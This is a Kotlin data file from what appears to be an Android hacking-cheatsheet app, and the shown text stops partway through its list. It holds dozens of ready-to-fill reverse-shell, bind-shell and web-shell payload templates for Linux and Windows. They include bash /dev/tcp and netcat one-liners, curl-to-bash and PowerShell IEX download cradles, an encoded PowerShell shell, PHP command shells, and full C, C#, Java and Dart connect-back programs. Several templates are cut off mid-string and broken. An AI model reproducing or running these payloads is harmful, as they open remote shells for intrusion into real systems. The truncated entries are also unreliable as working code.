package com.hackingcheatsheets.app.data

import java.net.URLEncoder
import java.nio.charset.StandardCharsets
import android.util.Base64

enum class ShellPlatform(val titleTr: String, val titleEn: String) {
    LINUX("Linux Reverse", "Linux Reverse"),
    WINDOWS("Windows Reverse", "Windows Reverse"),
    BIND_LINUX("Linux Bind", "Linux Bind"),
    BIND_WINDOWS("Windows Bind", "Windows Bind"),
    MSFVENOM("MSFVenom", "MSFVenom");

    val displayName: String get() = titleEn
}

enum class PayloadEncoding(val displayName: String) {
    NONE("None"),
    URL("URL"),
    DOUBLE_URL("Double URL"),
    BASE64("Base64")
}

data class ShellPayloadItem(
    val name: String,
    val category: String,
    val template: String,
    val platform: ShellPlatform,
    val id: String = name,
    val notes: String = ""
)

data class MsfvenomPreset(
    val name: String,
    val payload: String,
    val format: String,
    val platform: String,
    val extension: String,
    val id: String = name
)

object ReverseShellData {

    val LINUX_PAYLOADS: List<ShellPayloadItem> = listOf(
        ShellPayloadItem("Bash -i", "Bash / Sh", "bash -i >& /dev/tcp/{ip}/{port} 0>&1", ShellPlatform.LINUX),
        ShellPayloadItem("Bash 196", "Bash / Sh", "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196", ShellPlatform.LINUX),
        ShellPayloadItem("Bash read line", "Bash / Sh", "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done", ShellPlatform.LINUX),
        ShellPayloadItem("Bash 5", "Bash / Sh", "/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1", ShellPlatform.LINUX),
        ShellPayloadItem("Bash udp", "Bash / Sh", "bash -i >& /dev/udp/{ip}/{port} 0>&1", ShellPlatform.LINUX),
        ShellPayloadItem("nc mkfifo", "Netcat", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f", ShellPlatform.LINUX),
        ShellPayloadItem("nc -e", "Netcat", "nc {ip} {port} -e /bin/sh", ShellPlatform.LINUX),
        ShellPayloadItem("BusyBox nc -e", "Netcat", "busybox nc {ip} {port} -e /bin/sh", ShellPlatform.LINUX),
        ShellPayloadItem("nc -c", "Netcat", "nc -c /bin/sh {ip} {port}", ShellPlatform.LINUX),
        ShellPayloadItem("ncat -e", "Netcat", "ncat {ip} {port} -e /bin/sh", ShellPlatform.LINUX),
        ShellPayloadItem("ncat udp", "Netcat", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -u {ip} {port} >/tmp/f", ShellPlatform.LINUX),
        ShellPayloadItem("curl", "Other", "curl -s http://{ip}:{port}/shell.sh | bash", ShellPlatform.LINUX),
        ShellPayloadItem("rustcat", "Other", "rcat connect -s /bin/sh {ip} {port}", ShellPlatform.LINUX),
        ShellPayloadItem("C", "C / C#", "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){{\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {{\"/bin/sh\", NULL}};\n    execve(\"/bin/sh\", argv, NULL);\n\n    return 0;       \n}}", ShellPlatform.LINUX),
        ShellPayloadItem("C# TCP Client", "C / C#", "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\nnamespace ConnectBack {{\n    public class Program {{\n        static StreamWriter streamWriter;\n\n        public static void Main(string[] args) {{\n            using(TcpClient client = new TcpClient(\"{ip}\", {port})) {{\n                using(Stream stream = client.GetStream()) {{\n                    using(StreamReader rdr = new StreamReader(stream)) {{\n                        streamWriter = new StreamWriter(stream);\n                        \n                        StringBuilder strInput = new StringBuilder();\n\n                        Process p = new Process();\n                        p.StartInfo.FileName = \"/bin/sh\";\n                        p.StartInfo.CreateNoWindow = true;\n                        p.StartInfo.UseShellExecute = false;\n                        p.StartInfo.RedirectStandardOutput = true;\n                        p.StartInfo.RedirectStandardInput = true;\n                        p.StartInfo.RedirectStandardError = true;\n                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n                        p.Start();\n                        p.BeginOutputReadLine();\n\n                        while(true) {{\n                            strInput.Append(rdr.ReadLine());\n                            p.StandardInput.WriteLine(strInput);\n                            strInput.Remove(0, strInput.Length);\n                        }}\n                    }}\n                }}\n            }}\n        }}\n\n        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) {{\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data)) {{\n                try {{\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }} catch (Exception err) {{ }}\n            }}\n        }}\n    }}\n}}", ShellPlatform.LINUX),
        ShellPayloadItem("C# Bash -i", "Bash / Sh", "using System;\nusing System.Diagnostics;\n\nnamespace BackConnect {{\n    class ReverseBash {{\n        public static void Main(string[] args) {{\n            Process proc = new System.Diagnostics.Process();\n            proc.StartInfo.FileName = \"/bin/bash\";\n            proc.StartInfo.Arguments = \"-c \\\\\"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\\\\\"\";\n            proc.StartInfo.UseShellExecute = false;\n            proc.StartInfo.RedirectStandardOutput = true;\n            proc.Start();\n        }}\n    }}\n}}", ShellPlatform.LINUX),
        ShellPayloadItem("Haskell #1", "Other", "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} >/tmp/f\"", ShellPlatform.LINUX),
        ShellPayloadItem("OpenSSL", "Other", "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s", ShellPlatform.LINUX),
        ShellPayloadItem("Perl", "Perl", "perl -e 'use Socket;\$i=\"{ip}\";\$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'", ShellPlatform.LINUX),
        ShellPayloadItem("Perl no sh", "Bash / Sh", "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'", ShellPlatform.LINUX),
        ShellPayloadItem("Perl PentestMonkey", "Perl", "perl -MIO -e '\$p=fork;exit,if(\$p);foreach my \$key(keys %ENV){{if(\$ENV{{\$key}}=~/(.*)/s){{\$ENV{{\$key}}=\$1;}}}}\$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);while(<>){{if(\$_=~ /(.*)/s){{system \$1;}}}};'", ShellPlatform.LINUX),
        ShellPayloadItem("PHP PentestMonkey", "PHP", "php -r '\$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", ShellPlatform.LINUX),
        ShellPayloadItem("PHP Ivan Sincek", "Netcat", "php -r '\$sock=fsockopen(\"{ip}\",{port});\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);'", ShellPlatform.LINUX),
        ShellPayloadItem("PHP cmd", "PHP", "<?php if(isset(\$_REQUEST['cmd'])){{ echo \"<pre>\"; \$cmd = (\$_REQUEST['cmd']); system(\$cmd); echo \"</pre>\"; die; }}?>", ShellPlatform.LINUX),
        ShellPayloadItem("PHP cmd 2", "PHP", "<?php if(isset(\$_REQUEST['cmd'])){{ \$cmd = (\$_REQUEST['cmd']); exec(\$cmd, \$output); foreach(\$output as \$line){{ echo \$line.\"<br>\"; }} die; }}?>", ShellPlatform.LINUX),
        ShellPayloadItem("PHP cmd small", "PHP", "<?=`\$_GET[0]`?>", ShellPlatform.LINUX),
        ShellPayloadItem("PHP exec", "PHP", "php -r '\$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", ShellPlatform.LINUX),
        ShellPayloadItem("PHP shell_exec", "Bash / Sh", "php -r '\$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'", ShellPlatform.LINUX),
        ShellPayloadItem("PHP system", "PHP", "php -r '\$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'", ShellPlatform.LINUX),
        ShellPayloadItem("PHP passthru", "PHP", "php -r '\$sock=fsockopen(\"{ip}\",{port});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'", ShellPlatform.LINUX),
        ShellPayloadItem("PHP backtick", "PHP", "php -r '\$sock=fsockopen(\\\"{ip}\\\",{port});`/bin/sh -i <&3 >&3 2>&3`;'", ShellPlatform.LINUX),
        ShellPayloadItem("PHP popen", "PHP", "php -r '\$sock=fsockopen(\"{ip}\",{port});popen(\"/bin/sh -i <&3 >&3 2>&3", ShellPlatform.LINUX),
        ShellPayloadItem("PHP proc_open", "PHP", "php -r '\$sock=fsockopen(\"{ip}\",{port});\$proc=proc_open(\"/bin/sh -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'", ShellPlatform.LINUX),
        ShellPayloadItem("P0wny Shell (Webshell)", "Bash / Sh", "<?php\n\$SHELL = getenv(\"SHELL\") ? getenv(\"SHELL\") : \"/bin/sh\";\nfunction featureShell(\$cmd, \$cwd) {{\n    \$stdout = array();\n    if (preg_match(\"/^\\\\s*cd\\\\s*(2>&1)?\$/\", \$cmd)) {{\n        chdir(getenv(\"HOME\"));\n    }} elseif (preg_match(\"/^\\\\s*cd\\\\s+(.+)\\\\s*(2>&1)?\$/\", \$cmd)) {{\n        chdir(\$cwd);\n        preg_match(\"/^\\\\s*cd\\\\s+([^\\\\s]+)\\\\s*(2>&1)?\$/\", \$cmd, \$match);\n        chdir(\$match[1]);\n    }} elseif (preg_match(\"/^\\\\s*download\\\\s+[^\\\\s]+\\\\s*(2>&1)?\$/\", \$cmd)) {{\n        preg_match(\"/^\\\\s*download\\\\s+([^\\\\s]+)\\\\s*(2>&1)?\$/\", \$cmd, \$match);\n        return featureDownload(\$match[1]);\n    }} else {{\n        chdir(\$cwd);\n        exec(\$cmd, \$stdout);\n    }}\n    return array(\"stdout\" => \$stdout, \"cwd\" => getcwd());\n}}\necho '<h1>p0wny@shell:~#</h1>';\n?>", ShellPlatform.LINUX),
        ShellPayloadItem("Python #1", "Python", "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh", ShellPlatform.LINUX),
        ShellPayloadItem("Python #2", "Python", "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'", ShellPlatform.LINUX),
        ShellPayloadItem("Python3 #1", "Python", "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh", ShellPlatform.LINUX),
        ShellPayloadItem("Python3 #2", "Python", "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'", ShellPlatform.LINUX),
        ShellPayloadItem("Python3 shortest", "Bash / Sh", "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'", ShellPlatform.LINUX),
        ShellPayloadItem("Ruby #1", "Ruby", "ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});\$stdin.reopen(c);\$stdout.reopen(c);\$stderr.reopen(c);exec \"/bin/sh -i\"'", ShellPlatform.LINUX),
        ShellPayloadItem("Ruby no sh", "Bash / Sh", "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}", ShellPlatform.LINUX),
        ShellPayloadItem("socat #1", "Socat", "socat TCP:{ip}:{port} EXEC:/bin/sh", ShellPlatform.LINUX),
        ShellPayloadItem("socat #2 (TTY)", "Socat", "socat TCP:{ip}:{port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane", ShellPlatform.LINUX),
        ShellPayloadItem("sqlite3 nc mkfifo", "Netcat", "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'", ShellPlatform.LINUX),
        ShellPayloadItem("node.js", "Node.js", "require('child_process').exec('nc -e /bin/sh {ip} {port}')", ShellPlatform.LINUX),
        ShellPayloadItem("node.js #2", "Node.js", "(function(){{\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var client = new net.Socket();\n    client.connect({port}, \"{ip}\", function(){{\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    }});\n    return /a/;\n}})();", ShellPlatform.LINUX),
        ShellPayloadItem("Java #1", "Java", "Runtime r = Runtime.getRuntime();\nProcess p = r.exec(\"/bin/sh -c exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done\");\np.waitFor();", ShellPlatform.LINUX),
        ShellPayloadItem("Java #2", "Java", "String host=\"{ip}\";\nint port={port};\nString cmd=\"/bin/sh\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}};}};p.destroy();s.close();", ShellPlatform.LINUX),
        ShellPayloadItem("Java #3", "Java", "import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class RevShell {{\n    public static void main(String[] args) throws Exception {{\n        String host = \"{ip}\";\n        int port = {port};\n        String cmd = \"/bin/sh\";\n        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n        Socket s = new Socket(host, port);\n        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n        OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n        while (!s.isClosed()) {{\n            while (pi.available() > 0)\n                so.write(pi.read());\n            while (pe.available() > 0)\n                so.write(pe.read());\n            while (si.available() > 0)\n                po.write(si.read());\n            so.flush();\n            po.flush();\n            Thread.sleep(50);\n            try {{\n                p.exitValue();\n                break;\n            }} catch (Exception e) {{\n            }}\n        }}\n        p.destroy();\n        s.close();\n    }}\n}}", ShellPlatform.LINUX),
        ShellPayloadItem("Java Web", "Java", "<%@page import=\"java.lang.*\"%>\n<%@page import=\"java.util.*\"%>\n<%@page import=\"java.io.*\"%>\n<%@page import=\"java.net.*\"%>\n\n<%\n  class StreamConnector extends Thread\n  {{\n    InputStream is;\n    OutputStream os;\n\n    StreamConnector( InputStream is, OutputStream os )\n    {{\n      this.is = is;\n      this.os = os;\n    }}\n\n    public void run()\n    {{\n      BufferedReader in  = null;\n      BufferedWriter out = null;\n      try\n      {{\n        in  = new BufferedReader( new InputStreamReader( this.is ) );\n        out = new BufferedWriter( new OutputStreamWriter( this.os ) );\n        char buffer[] = new char[8192];\n        int length;\n        while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )\n        {{\n          out.write( buffer, 0, length );\n          out.flush();\n        }}\n      }} catch( Exception e ){{}}\n      try\n      {{\n        if( in != null )\n          in.close();\n        if( out != null )\n          out.close();\n      }} catch( Exception e ){{}}\n    }}\n  }}\n\n  try\n  {{\n    Socket socket = new Socket( \"{ip}\", {port} );\n    Process process = Runtime.getRuntime().exec( \"/bin/sh\" );\n    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();\n    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();\n  }} catch( Exception e ) {{}}\n%>", ShellPlatform.LINUX),
        ShellPayloadItem("Java Two Way", "Java", "import java.io.*;\nimport java.net.*;\n\npublic class shell {{\n    public static void main(String[] args) {{\n        String host = \"{ip}\";\n        int port = {port};\n        String cmd = \"/bin/sh\";\n        try {{\n            Process p = Runtime.getRuntime().exec(cmd);\n            Socket s = new Socket(host, port);\n            new Thread(() -> {{\n                try {{\n                    InputStream is = p.getInputStream();\n                    OutputStream os = s.getOutputStream();\n                    int i;\n                    while ((i = is.read()) != -1) os.write(i);\n                }} catch (Exception e) {{}}\n            }}).start();\n            new Thread(() -> {{\n                try {{\n                    InputStream is = s.getInputStream();\n                    OutputStream os = p.getOutputStream();\n                    int i;\n                    while ((i = is.read()) != -1) os.write(i);\n                }} catch (Exception e) {{}}\n            }}).start();\n        }} catch (Exception e) {{}}\n    }}\n}}", ShellPlatform.LINUX),
        ShellPayloadItem("Javascript", "Node.js", "String.fromCharCode(10);var x=new ActiveXObject(\"WScript.Shell\").Exec(\"/bin/sh\");", ShellPlatform.LINUX),
        ShellPayloadItem("telnet", "Other", "TF=\$(mktemp -u);mkfifo \$TF && telnet {ip} {port} 0<\$TF | /bin/sh 1>\$TF", ShellPlatform.LINUX),
        ShellPayloadItem("zsh", "Bash / Sh", "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'", ShellPlatform.LINUX),
        ShellPayloadItem("Lua #1", "Lua", "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"", ShellPlatform.LINUX),
        ShellPayloadItem("Lua #2", "Lua", "lua5.1 -e 'local host, port = \"{ip}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'", ShellPlatform.LINUX),
        ShellPayloadItem("Golang", "Golang", "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp", ShellPlatform.LINUX),
        ShellPayloadItem("Vlang", "Other", "echo 'import os' > /tmp/t.v && echo 'import net' >> /tmp/t.v && echo 'fn main() {{ mut sock := net.dial(\"{ip}\", {port}) or {{ return }} os.dup2(sock.sockfd, 0) os.dup2(sock.sockfd, 1) os.dup2(sock.sockfd, 2) os.execve(\"/bin/sh\", []string{{}}, []string{{}}) }}' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v", ShellPlatform.LINUX),
        ShellPayloadItem("Awk", "AWK", "gawk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print \$0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null", ShellPlatform.LINUX),
        ShellPayloadItem("Dart", "Other", "import 'dart:io';\nimport 'dart:convert';\n\nmain() {{\n  Socket.connect(\"{ip}\", {port}).then((socket) {{\n    socket.listen((data) {{\n      Process.start('/bin/sh', []).then((Process process) {{\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n            .transform(utf8.decoder)\n            .listen((output) {{ socket.write(output); }});\n      }});\n    }},\n    onDone: () {{\n      socket.destroy();\n    }});\n  }});\n}}", ShellPlatform.LINUX),
        ShellPayloadItem("Crystal (system)", "Other", "crystal eval 'require \"process\";require \"socket\";s=Socket.tcp(Socket::Family::INET);s.connect(\"{ip}\",{port});Process.run(\"/bin/sh\",output:s,input:s,error:s)'", ShellPlatform.LINUX),
        ShellPayloadItem("Crystal (code)", "Other", "require \"socket\"\nrequire \"process\"\n\ns = Socket.tcp(Socket::Family::INET)\ns.connect(\"{ip}\", {port})\nProcess.run(\"/bin/sh\", output: s, input: s, error: s)", ShellPlatform.LINUX)
    )

    val WINDOWS_PAYLOADS: List<ShellPayloadItem> = listOf(
        ShellPayloadItem("nc.exe -e", "Netcat", "nc.exe {ip} {port} -e cmd.exe", ShellPlatform.WINDOWS),
        ShellPayloadItem("ncat.exe -e", "Netcat", "ncat.exe {ip} {port} -e cmd.exe", ShellPlatform.WINDOWS),
        ShellPayloadItem("PowerShell #1", "PowerShell", "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}};\$client.Close()\"", ShellPlatform.WINDOWS),
        ShellPayloadItem("PowerShell #2", "PowerShell", "powershell -nop -W hidden -noni -ep bypass -c \"\$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});\$NetworkStream = \$TCPClient.GetStream();\$StreamWriter = New-Object IO.StreamWriter(\$NetworkStream);function WriteToStream (\$String) {{[byte[]]\$script:Buffer = 0..\$TCPClient.ReceiveBufferSize | % {{0}};\$StreamWriter.Write(\$String + 'SHELL> ');\$StreamWriter.Flush()}}WriteToStream '';while((\$BytesRead = \$NetworkStream.Read(\$Buffer, 0, \$Buffer.Length)) -gt 0) {{\$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead - 1);\$Output = try {{Invoke-Expression \$Command 2>&1 | Out-String}} catch {{\$_ | Out-String}}WriteToStream (\$Output)}}\$StreamWriter.Close()\"", ShellPlatform.WINDOWS),
        ShellPayloadItem("PowerShell #3 (Base64)", "PowerShell", "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBpAHAAfQAiACwAewBwAG8AcgB0AH0AKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=", ShellPlatform.WINDOWS),
        ShellPayloadItem("PowerShell #4 (TCP)", "PowerShell", "\$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}};\$client.Close()", ShellPlatform.WINDOWS),
        ShellPayloadItem("PowerShell #5 (IEX)", "PowerShell", "IEX(IWR http://{ip}:{port}/shell.ps1 -UseBasicParsing)", ShellPlatform.WINDOWS),
        ShellPayloadItem("C Windows", "C / C#", "#include <winsock2.h>\n#include <stdio.h>\n#pragma comment(lib,\"ws2_32\")\n\nWSADATA wsaData;\nSOCKET Winsock;\nstruct sockaddr_in hax;\nchar ip_addr[16] = \"{ip}\";\nint port = {port};\nSTARTUPINFO ini_processo;\nPROCESS_INFORMATION processo_info;\n\nint main()\n{{\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\n    \n    hax.sin_family = AF_INET;\n    hax.sin_port = htons(port);\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\n    \n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\n    \n    memset(&ini_processo, 0, sizeof(ini_processo));\n    ini_processo.cb = sizeof(ini_processo);\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;\n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\n    \n    TCHAR cmd[255] = TEXT(\"cmd.exe\");\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\n    \n    return 0;\n}}", ShellPlatform.WINDOWS),
        ShellPayloadItem("C# TCP Client Windows", "C / C#", "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\nnamespace ConnectBack {{\n    public class Program {{\n        static StreamWriter streamWriter;\n\n        public static void Main(string[] args) {{\n            using(TcpClient client = new TcpClient(\"{ip}\", {port})) {{\n                using(Stream stream = client.GetStream()) {{\n                    using(StreamReader rdr = new StreamReader(stream)) {{\n                        streamWriter = new StreamWriter(stream);\n                        \n                        StringBuilder strInput = new StringBuilder();\n\n                        Process p = new Process();\n                        p.StartInfo.FileName = \"cmd.exe\";\n                        p.StartInfo.CreateNoWindow = true;\n                        p.StartInfo.UseShellExecute = false;\n                        p.StartInfo.RedirectStandardOutput = true;\n                        p.StartInfo.RedirectStandardInput = true;\n                        p.StartInfo.RedirectStandardError = true;\n                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n                        p.Start();\n                        p.BeginOutputReadLine();\n\n                        while(true) {{\n                            strInput.Append(rdr.ReadLine());\n                            p.StandardInput.WriteLine(strInput);\n                            strInput.Remove(0, strInput.Length);\n                        }}\n                    }}\n                }}\n            }}\n        }}\n\n        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) {{\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data)) {{\n                try {{\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }} catch (Exception err) {{ }}\n            }}\n        }}\n    }}\n}}", ShellPlatform.WINDOWS),
